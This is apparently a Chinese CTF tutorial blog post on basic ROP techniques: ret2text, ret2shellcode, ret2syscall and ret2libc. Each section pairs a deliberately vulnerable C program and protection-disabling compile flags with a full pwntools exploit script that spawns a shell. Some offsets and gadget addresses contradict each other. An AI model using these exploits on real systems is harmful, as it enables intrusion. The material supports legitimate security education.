---
title: 基本ROP
pubDate: 2026-03-09T15:46:00
updateDate: 2026-03-12T11:28:00
category: Pwn小知识
tags:
  - Pwn
  - Stack
  - ret2text
  - ret2syscall
  - ret2shellcode
  - ret2libc
---
**ROP（Return-Oriented Programming）** 是利用栈溢出控制程序执行流程的一种经典技术。

在基础 Pwn 题目中，常见的利用方式包括：

- ret2text：跳转到程序已有函数
- ret2shellcode：执行注入的 shellcode
- ret2syscall：直接构造系统调用
- ret2libc：调用 libc 中的函数

本文介绍几种基础 ROP 利用方式。

## ret2text

### 原理

控制程序的返回地址（Return Address），使程序在执行 `ret` 指令时跳转到程序 **代码段（.text）中已有的函数或代码片段**（例如调用 `system("/bin/sh")` 的函数）

程序本身包含了一个后门函数（比如直接打印 flag 或执行 `system("/bin/sh")`）或者一段有用的代码片段，通过栈溢出输入超长的数据，覆盖栈上的返回地址为我们期望执行的代码位置，当函数执行 `ret` 指令时，CPU 就会跳转到后门函数去执行，而不是返回原来的调用者

### 适用条件

- 存在栈溢出漏洞

- 程序中存在可利用的后门函数或代码片段

- 通常需要关闭 PIE (地址随机化)：如果开启 PIE（Position Independent Executable），程序代码段会被随机映射，导致函数地址每次运行都会变化，所以就不知道后门函数在哪了（除非先泄露地址）

- 可以开启 NX (堆栈不可执行)：因为 ret2text 是跳转到已有的代码段去执行，而不是在栈上执行我们写入的 shellcode，所以它不怕 NX 保护

- 通常需要关闭Canary保护：因为实现 ret2text 需要覆盖返回地址，这个过程会覆盖返回地址前的所有数据，会触发Canary保护而导致程序异常退出

### 漏洞代码

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// 这是一个后门函数，正常逻辑下永远不会被调用
void backdoor() {
    puts("Success! Here is your shell.");
    system("/bin/sh");
}

void vuln() {
    char buffer[20];
    puts("what's your name: ");
    // 漏洞点：gets 不检查长度，导致溢出
    gets(buffer);
    printf("hello,%s",buffer);
}

int main() {
    vuln();
    return 0;
}
```

### 编译方式

为了学习方便，关闭 PIE 和 Canary：

```bash
gcc -no-pie -fno-stack-protector -o pwn_me source.c
```

### 攻击思路

第一步：确定溢出偏移 (Offset)
我们需要知道输入多少个垃圾字符后，才能刚好碰到“返回地址”

`buffer` 大小是 20 字节

在 64 位系统中，通常栈布局是：`[buffer] + [saved_rbp (8字节)] + [return_address (8字节)]`。
虽然 `buffer` 声明为 20 字节，但编译器通常会进行 栈对齐（stack alignment），因此实际分配的空间可能是 24 或 32 字节。

实际偏移通常需要通过调试工具确定，例如：

- gdb
- pwntools 的 cyclic

通过调试（如使用 gdb 或 `cyclic`）发现，偏移量是 40（32 + 8） 字节，之后紧接着就是返回地址

第二步：找到后门地址 (Address)
因为关闭了 PIE，函数的地址是固定的，我们可以用 `objdump` 或 IDA 查看 `backdoor` 函数的地址

```bash
objdump -d pwn_me | grep backdoor
# 输出示例：
# 0000000000401176 <backdoor>:
```

这里 `0x401176` 就是我们的目标地址。

### Payload 构造

Payload 的结构如下：
`[ 'A' * 偏移量 ] + [ backdoor_addr ]`

填充：32 个 'A' (覆盖 buffer 和 saved rbp)
返回地址：`0x401176` (覆盖原本的 return address)

### Exploit 示例

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn_me")
rop = ROP(exe)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    p = conn()

    offset = 0x20 + 8
    padding = b"A" * offset

    fun_addr = exe.sym["backdoor"]
    ret_addr = rop.find_gadget(["ret"])[0]

    payload = flat([padding, ret_addr, fun_addr])

    p.recv()
    p.sendline(payload)

    p.interactive()


if __name__ == "__main__":
    main()
```

### 常见问题

**Stack Alignment (栈对齐)**

在 64 位系统（尤其是 Ubuntu 18.04+）中，可能会遇到一个坑：脚本写得对，地址也对，但程序跳转到 `system` 时崩溃了

原因：在 x86_64 ABI 规范中，函数调用前要求栈保持 16 字节对齐。如果对齐错误，某些 SIMD 指令（例如 movaps）会导致程序崩溃。

解决方法：

在跳转到 `backdoor` 之前，先跳到一个 `ret` 指令
`ret` 指令会从栈顶弹出一个地址到 `RIP`，并使 `RSP += 8`（64 位），它会让栈指针移动 8 字节，从而再次把栈对齐

修正后的 Payload：

```python
ret_addr = 0x40101a # 用 ROPgadget 找一个 ret 指令的地址
payload = flat([
    b'A' * offset,
    ret_addr,       # 先跳这里，对齐栈
    backdoor_addr   # 再跳后门
])
```

## ret2shellcode

### 原理

核心原理：攻击者自己编写或注入一段恶意的机器码（即 Shellcode）到程序的内存中（通常是栈上），然后通过栈溢出修改返回地址，让 CPU 跳转到这段注入的代码上去执行。

### 适用条件

没有开启 NX 保护 (No-Execute / DEP)：内存中的栈段（Stack）必须拥有 可执行（Executable） 权限，如果开启了 NX，栈只能读写不能执行（RW-），CPU 跳转到栈上执行代码时会直接报 Segmentation Fault

知道 Shellcode 在内存中的地址：要知道注入的 Shellcode 存在哪（通常是 buffer 的起始地址），这样才能把返回地址改成它

### 漏洞代码

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void vuln() {
    char buf[100];
    printf("The address of buf is: %p\n", buf); // 为了简化难度，题目直接告诉了我们 buf 的地址
    puts("Input your shellcode:");
    read(0, buf, 200); // 漏洞点：buf 只有 100，但读了 200，存在溢出
}

int main() {
    vuln();
    return 0;
}
```

### 编译方式

为了演示，我们需要在编译时关闭 NX 保护。
关键参数 `-z execstack`：

```bash
# -z execstack: 关闭 NX 保护，让栈可执行
# -fno-stack-protector: 关闭 Canary 保护
# -no-pie: 关闭地址随机化 (方便演示)
gcc -z execstack -fno-stack-protector -no-pie -o pwn_shell source.c
```

### 攻击思路

目标：执行 `system("/bin/sh")` 拿到 Shell。

问题：程序里没有 `system` 函数，也没有 `/bin/sh` 字符串。

对策：我们把生成 Shell 的机器码（Shellcode）作为输入发给 `read`，存到 `buf` 里。然后把返回地址改成 `buf` 的地址。

### Payload 构造

我们希望栈变成这样：

```text
高地址
+------------------+
| buf 的地址        |  <-- 覆盖原本的 Return Address (让 CPU 跳回 buf)
+------------------+
| ... 填充数据 ...  |  <-- 填满 buffer 剩下的空间 + 覆盖 old ebp
+------------------+
|                  |
|   Shellcode      |  <-- 我们的恶意代码
| (execve /bin/sh) |
|                  |
+------------------+  <-- buf 的起始地址 (ESP 指向这附近)
低地址

```

计算偏移：

`buf` 大小是 100。
通常会有一些对齐或者 old ebp（32位是4字节，64位是8字节）。
假设通过调试（gdb `cyclic`）发现，偏移量是 112 字节后碰到返回地址。

### Exploit 示例

这里我们使用 Pwntools 自动生成 Shellcode

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    p = conn()

    p.recvuntil("The address of buf is: ")
    buf_addr_str = p.recvline().strip()
    buf_addr = int(buf_addr_str, 16)

    log.success(f"Buffer Address: {hex(buf_addr)}")

    # Pwntools 自带生成 shellcode 的功能
    # asm() 将汇编代码编译成机器码字节流
    shellcode = asm(shellcraft.sh())

    # 打印一下看看 shellcode 有多长，确保 buf 放得下
    log.info(f"Shellcode length: {len(shellcode)}")

    # 结构：[ Shellcode ] + [ Padding ] + [ Return Address ]

    # 计算需要填充的长度：总偏移 - Shellcode 长度
    padding_len = 0x70 + 8 - len(shellcode) - 20
    log.info("padding_len:" + str(padding_len))

    payload = flat(
        [
            b"\x90" * 20,
            shellcode,  # 先放 shellcode
            cyclic(padding_len),  # 再填满剩下的空间
            buf_addr + 10,  # 最后覆盖返回地址，指向 buf 开头
        ]
    )

    p.recv()
    p.sendline(payload)

    p.interactive()


if __name__ == "__main__":
    main()
```

### 常见问题

**NOP Sled (滑雪梯)**

在实际情况中，我们可能并不精准知道 `buf` 的起始地址（比如可能受环境变量影响偏移了几个字节）。如果跳歪了，跳到了 Shellcode 中间，程序就会崩溃。

为了增加成功率，我们通常在 Shellcode 前面铺一层 NOP 指令 (`\x90`)。

NOP：No Operation，CPU 遇到这个指令什么都不做，直接执行下一条。
原理：只要返回地址跳到了 NOP 区域的任意位置，CPU 就会像滑滑梯一样一路滑下来，最终滑进我们的 Shellcode。

更稳健的 Payload 结构：
`[ NOPs ] + [ Shellcode ] + [ Padding ] + [ Ret Addr (指向 NOP 中间) ]`

## ret2syscall

### 原理

核心原理：不再依赖程序里现有的函数（如 `system`）或自己写入的 Shellcode，而是利用程序中零散的汇编指令片段（Gadgets），拼凑出一套“系统调用（System Call）”的参数，最后执行系统调用指令进内核拿 Shell。

### 适用条件

- NX 开启：栈不可执行，无法使用 `ret2shellcode`

- 静态编译 (Statically Linked)：这是 `ret2syscall` 最常见的应用场景。静态编译的程序没有动态链接库 (libc)，虽然体积大，但里面包含了大量的代码片段（Gadgets），非常适合在里面凑指令

- 没有 `system` 函数：程序里没调用过 `system`，无法直接 `ret2text`

#### 系统调用规则

在 Linux 32位系统中，触发系统调用（如 `execve`）需要满足以下寄存器状态：

| 寄存器 | 作用    | 目标值 (执行 execve)          |
| --- | ----- | ------------------------ |
| EAX | 系统调用号 | 0xb (十进制 11，代表 `execve`) |
| EBX | 第一个参数 | 指向 "/bin/sh" 字符串的地址      |
| ECX | 第二个参数 | 0 (NULL)                 |
| EDX | 第三个参数 | 0 (NULL)                 |
| 指令  | 触发调用  | `int 0x80`               |

### 漏洞代码

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

const char *binsh = "/bin/sh";

void vuln() {
    char buf[32];
    puts("Give me some gadgets:");
    read(0, buf, 200); // 典型的栈溢出
}

int main() {
    vuln();
    return 0;
}
```

### 编译方式

```bash
gcc -m32 -static -fno-stack-protector -o pwn_static source.c
```

### 攻击思路

攻击准备：寻找 Gadgets

用工具（如 `ROPgadget`）在二进制文件里寻找能够操作寄存器的指令片段。

需要凑齐：

1. 控制 EAX: `pop eax; ret`
2. 控制 EBX, ECX, EDX: `pop ebx; pop ecx; pop edx; ret` (或者分开找)
3. 字符串: `/bin/sh` 的地址
4. 触发指令: `int 0x80`

查找过程：

```bash
# 1. 找控制 eax 的 gadget
$ ROPgadget --binary pwn_static --only "pop|ret" | grep eax
0x080b81b6 : pop eax ; ret

# 2. 找控制 ebx, ecx, edx 的 gadget
$ ROPgadget --binary pwn_static --only "pop|ret" | grep "pop edx"
0x0806ee90 : pop edx ; pop ecx ; pop ebx ; ret

# 3. 找 "/bin/sh" 字符串
$ ROPgadget --binary pwn_static --string "/bin/sh"
0x080be408 : /bin/sh

# 4. 找 int 0x80
$ ROPgadget --binary pwn_static --opcode "cd80" 或
$ ROPgadget --binary pwn_static --only "int"
0x08049421 : int 0x80

```

### Payload 构造

我们需要在栈上精心排列数据，让 `pop` 指令像吃豆人一样，把我们放在栈上的数据“吃”进寄存器。

栈布局设计：

```text
+-------------------+
|   Padding (44字节) | <-- 覆盖 buf + old_ebp
+-------------------+
| 0x0809c376        | <-- pop eax; ret
+-------------------+
| 0x0000000b        | <-- 0xb (execve号) -> 存入 EAX
+-------------------+
| 0x0806eb90        | <-- pop edx; pop ecx; pop ebx; ret
+-------------------+
| 0x00000000        | <-- 0 -> 存入 EDX
+-------------------+
| 0x00000000        | <-- 0 -> 存入 ECX
+-------------------+
| 0x080be408        | <-- "/bin/sh"地址 -> 存入 EBX
+-------------------+
| 0x08049421        | <-- int 0x80 (触发系统调用)
+-------------------+
```

### Exploit 示例

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
rop = ROP(exe)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    p = conn()

    pop_eax_ret = rop.find_gadget(["pop eax", "ret"])[0]
    pop_edx_ecx_ebx_ret = rop.find_gadget(["pop edx", "pop ecx", "pop ebx", "ret"])[0]
    int_0x80 = rop.find_gadget(["int 0x80"])[0]
    bin_sh_addr = next(exe.search(b"/bin/sh"))

    offset = 44
    padding = b"A" * offset

    payload = flat(
        [
            padding,
            pop_eax_ret,
            0xB,
            pop_edx_ecx_ebx_ret,
            0,
            0,
            bin_sh_addr,
            int_0x80,
        ]
    )

    p.recv()
    p.sendline(payload)

    p.interactive()


if __name__ == "__main__":
    main()
```

### 常见问题

64位系统的区别：

如果是 64 位程序，原理完全一样，但有四点不同：

调用号不同：
调用号存入 RAX (64位的 execve 是 59，即 0x3b)

寄存器不同：
参数顺序：RDI (filename), RSI (argv), RDX (envp)

触发指令不同：
使用 `syscall` 而不是 `int 0x80`

Gadget 查找：
需要找 `pop rdi; ret`, `pop rsi; ret` 等

## ret2libc

### 原理

核心原理：既然我们无法在栈上执行 Shellcode（因为 NX 开启），那我们就去借用程序已经加载的动态链接库（libc.so）里的函数来帮我们干坏事。 最常用的目标就是 libc 里的 `system` 函数

要理解 ret2libc，需要搞懂两个概念：动态链接库 和 ASLR

**为什么要借用 libc？**

- 资源丰富：libc 是 Linux 下 C 语言的标准库，几乎所有程序都会加载它。里面包含了大量强大的函数（如 `system`, `execve`, `mprotect`）和字符串（如 `"/bin/sh"`）

- 自带执行权限：libc 的代码段本身就是可执行的（r-x），NX 防不住它

**难点：ASLR (地址空间布局随机化)**

现代系统开启 ASLR 后，libc 每次加载到内存的基地址 (Base Address) 都是随机变化的

- 我们不知道 `system` 函数现在的具体地址
- 但是，libc 内部函数之间的相对偏移 (Offset) 是固定的（由 libc 版本决定）

攻击公式：

1. 泄露 (Leak)：利用溢出调用 `puts` 或 `printf`，打印出某个已解析函数（如 `read` 或 `puts`）在 GOT 表中的真实地址
2. 计算：

- `libc_base_addr` = `泄露地址` - `该函数的固定偏移`
- `system_addr` = `libc_base_addr` + `system的固定偏移`
- `binsh_addr` = `libc_base_addr` + `str_bin_sh的固定偏移`

1. 攻击 (Exploit)：再次触发溢出，调用 `system("/bin/sh")`

### 适用条件

### 漏洞代码

为了方便理解栈结构，我们以 32位 程序为例（64位原理一样，只是传参方式不同）。

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    char buf[32];
    puts("Input:");
    read(0, buf, 100); // 溢出点
}

int main() {
    vuln();
    return 0;
}
```

### 编译方式

```bash
gcc -m32 -fno-stack-protector -o pwn_libc source.c
```

### 攻击思路

### Payload 构造

假设我们拿到了二进制文件 `pwn_libc` 和目标系统使用的 `libc.so.6`。

栈布局目标（Payload 1 - 泄露）：
我们希望程序执行 `puts(puts_got)`，打印出 `puts` 的真实地址，然后返回到 `main` 函数（为了让我们有机会再次输入 Payload 2）。

```text
+---------------------+
| Padding (44字节)     | <-- 覆盖 buf + old_ebp
+---------------------+
| puts_plt            | <-- 返回地址：跳去执行 puts
+---------------------+
| main_addr           | <-- puts 执行完后的返回地址：跳回 main (以便第二次溢出)
+---------------------+
| puts_got            | <-- puts 的参数：打印 puts 在 GOT 表里的真实值
+---------------------+
```

栈布局目标（Payload 2 - Get Shell）：
我们已经算出了 `system` 的地址，现在要执行 `system("/bin/sh")`。

```text
+---------------------+
| Padding (44字节)     |
+---------------------+
| system_addr         | <-- 返回地址：跳去执行 system
+---------------------+
| 0xdeadbeef          | <-- system 执行完后的返回地址 (填垃圾数据，因为shell都要拿到了)
+---------------------+
| binsh_addr          | <-- system 的参数：指向 "/bin/sh"
+---------------------+
```

### Exploit 示例

```python
from pwn import *

context(os='linux', arch='i386', log_level='debug')
p = process('./pwn_libc')
elf = ELF('./pwn_libc')
# 需要指定正确的 libc 版本，如果是远程通常用 LibcSearcher 或提供的 libc
libc = ELF('/lib/i386-linux-gnu/libc.so.6') 

# ====================
# 第一步：泄露 Libc 地址
# ====================

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']
offset = 44 # 32(buf) + 4(ebp)，需调试确认

# 构造 Payload 1: puts(puts_got) -> return main
payload1 = flat([
    b'A' * offset,
    puts_plt,
    main_addr,    # 这里的关键：打完泄露要能回来！
    puts_got
])

p.recvuntil("Input:\n")
p.sendline(payload1)

# 接收泄露的地址
# u32() 解包 4 字节数据，ljust 补齐长度
leak_msg = p.recv(4)
puts_real_addr = u32(leak_msg.ljust(4, b'\x00'))
log.success(f"Leaked puts address: {hex(puts_real_addr)}")

# ====================
# 第二步：计算基址和目标地址
# ====================

# 核心公式：基址 = 真实地址 - 偏移量
libc_base = puts_real_addr - libc.symbols['puts']
log.success(f"Libc Base: {hex(libc_base)}")

# 计算 system 和 "/bin/sh" 的真实地址
system_addr = libc_base + libc.symbols['system']
# next() 用于获取生成器里的第一个结果
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

log.success(f"System Address: {hex(system_addr)}")
log.success(f"/bin/sh Address: {hex(binsh_addr)}")

# ====================
# 第三步：Get Shell
# ====================

# 构造 Payload 2: system("/bin/sh")
payload2 = flat([
    b'A' * offset,
    system_addr,
    0xdeadbeef,   # system 的返回地址，随便填
    binsh_addr    # system 的参数
])

# 因为程序跳回了 main，所以可以再次发送输入
p.recvuntil("Input:\n")
p.sendline(payload2)

p.interactive()
```

### 常见问题

32位与64位的区别

上面的例子是 32 位的。如果是 64 位程序，ret2libc 的逻辑完全一样，但Payload 的构造有区别：

- 传参方式不同：
- 32位：参数放在栈上（就在函数地址下面）。
- 64位：参数优先放在寄存器（`RDI`, `RSI`, `RDX`...）。

- 需要 Gadget：
- 64位调用 `puts(puts_got)` 时，必须先用 `pop rdi; ret` 把 `puts_got` 放入 `RDI` 寄存器。
- 64位调用 `system("/bin/sh")` 时，必须先用 `pop rdi; ret` 把 `/bin/sh` 地址放入 `RDI` 寄存器。

64位 Payload 2 示例：
`Padding + [pop_rdi_ret] + [binsh_addr] + [system_addr]`

*(注意：64位不需要像32位那样在 system 和参数之间塞一个 4 字节的伪造返回地址，因为参数已经被 pop 走了)*

---
参考资料：

[CTF-Wiki](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/)
